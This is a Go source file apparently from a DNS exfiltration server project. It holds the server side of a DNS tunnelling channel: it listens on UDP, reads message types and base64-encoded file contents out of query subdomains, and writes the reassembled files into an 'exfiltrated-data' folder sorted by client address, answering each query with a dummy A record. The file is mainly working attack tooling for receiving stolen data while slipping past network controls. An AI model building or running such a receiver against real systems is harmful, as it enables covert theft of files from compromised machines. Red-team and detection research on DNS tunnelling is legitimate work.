package exfiltrator

import (
	"dns-exfiltration-server/fileutils"
	"encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"path"
	"strings"

	"github.com/miekg/dns"
)

const (
	// Messages carried by UDP are restricted to 512 bytes (not counting the IP
	// or UDP headers).
	// - https://www.rfc-editor.org/rfc/rfc1035#section-4.2.1
	MAX_UDP_PACKET_SIZE = 512
	EXFILTRATION_DIR    = "./exfiltrated-data"
)

type dnsExfiltrator struct {
	nameServer      string
	unprocessedData map[string][]byte
	openFiles       map[string]map[string]*os.File
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	absoluteNameServer := nameServer
	if nameServer[len(nameServer)-1] != '.' {
		absoluteNameServer += "."
	}

	fileutils.CreateDirIfNotExists(EXFILTRATION_DIR)

	return &dnsExfiltrator{
		nameServer:      absoluteNameServer,
		unprocessedData: make(map[string][]byte),
		openFiles:       make(map[string]map[string]*os.File),
	}
}

func decodeFromModifiedBase64(modifiedBase64Data string) []byte {
	base64Data := strings.Replace(modifiedBase64Data, "-", "=", -1)
	data, err := base64.URLEncoding.DecodeString(base64Data)
	if err != nil {
		log.Fatalln(err)
	}
	return data
}

func getFilePathFromEncodedFilename(dir string, encodedFilename string) string {
	filename := decodeFromModifiedBase64(encodedFilename)
	return path.Join(dir, string(filename))
}

func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer string) {
	buf := make([]byte, MAX_UDP_PACKET_SIZE)
	for {
		_, clientAddr, err := udpServer.ReadFromUDP(buf)
		if err != nil {
			log.Fatalln(err)
		}

		var request dns.Msg
		request.Unpack(buf)
		name := request.Question[0].Name
		subdomains := strings.Split(name, nameServer)[0]
		msgType, msg := func() (string, string) {
			x := strings.SplitN(subdomains, ".", 2)
			return x[0], x[1]
		}()
		data := strings.ReplaceAll(msg, ".", "")

		clientDir := path.Join(EXFILTRATION_DIR, clientAddr.String())

		// Initialise the inner map if uninitialised.
		if _, ok := ex.openFiles[clientAddr.String()]; !ok {
			ex.openFiles[clientAddr.String()] = make(map[string]*os.File)
		}

		switch msgType {
		case DNS_FILE_START.String():
			fileutils.CreateDirIfNotExists(clientDir)
			filename := getFilePathFromEncodedFilename(clientDir, data)
			file := fileutils.CreateFileIfNotExists(filename)
			ex.openFiles[clientAddr.String()][filename] = file
		case DNS_FILE_END.String():
			filename := getFilePathFromEncodedFilename(clientDir, data)
			file := ex.openFiles[clientAddr.String()][filename]
			decodedData := decodeFromModifiedBase64(string(ex.unprocessedData[clientAddr.String()]))
			_, err := file.Write(decodedData)
			if err != nil {
				log.Fatalln(err)
			}
			err = file.Close()
			if err != nil {
				log.Fatalln(err)
			}
		case DNS_FILE_DATA.String():
			ex.unprocessedData[clientAddr.String()] = append(ex.unprocessedData[clientAddr.String()], data...)
		default:
			log.Printf("Unknown message type: '%s'", msgType)
		}

		var reply dns.Msg
		reply.SetReply(&request)
		rr, err := dns.NewRR(fmt.Sprintf("%s 300 IN A 8.8.8.8", name))
		if err != nil {
			log.Fatalln(err)
		}
		reply.Answer = append(reply.Answer, rr)

		response, err := reply.Pack()
		if err != nil {
			log.Fatalln(err)
		}
		udpServer.WriteToUDP(response, clientAddr)
	}
}
